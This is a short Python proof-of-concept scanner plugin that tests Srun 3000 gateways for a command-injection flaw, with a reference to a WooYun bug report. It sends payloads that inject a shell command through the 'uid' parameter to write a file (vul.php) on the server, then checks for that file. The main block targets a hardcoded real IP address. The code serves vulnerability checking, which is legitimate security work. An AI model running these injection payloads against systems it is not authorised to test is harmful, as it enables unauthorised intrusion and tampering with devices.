#!/usr/bin/env python
#-*- coding:utf-8 -*-
#ref:http://wooyun.org/bugs/wooyun-2010-052191 

import urlparse


def assign(service, arg):
    if service == 'srun_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    pocs = ['user_info.php?uid=;echo+\'testvul1\'+>>vul.php;'
    ,'user_info_en.php?uid=;echo+\'testvul2\'+>>vul.php;'
    ,'user_info1.php?uid=;echo+\'testvul3\'+>>vul.php;']
    for poc in pocs:
        poc = arg + poc
        code, head, res, errcode, _ = curl.curl2(poc)
    verify = arg+'vul.php'
    code, head, res, errcode, _ = curl.curl2(verify)
    if 'testvul1' in res:
        security_hole("Srun_3000 Gate RCE vulnerable!:"+arg+pocs[0])
    if 'testvul2' in res:
        security_hole("Srun_3000 Gate RCE vulnerable!:"+arg+pocs[1])
    if 'testvul3' in res:
        security_hole("Srun_3000 Gate RCE vulnerable!:"+arg+pocs[2])

if __name__ == '__main__':
    from dummy import *
    audit(assign('srun_gateway', 'http://202.201.208.126/')[1])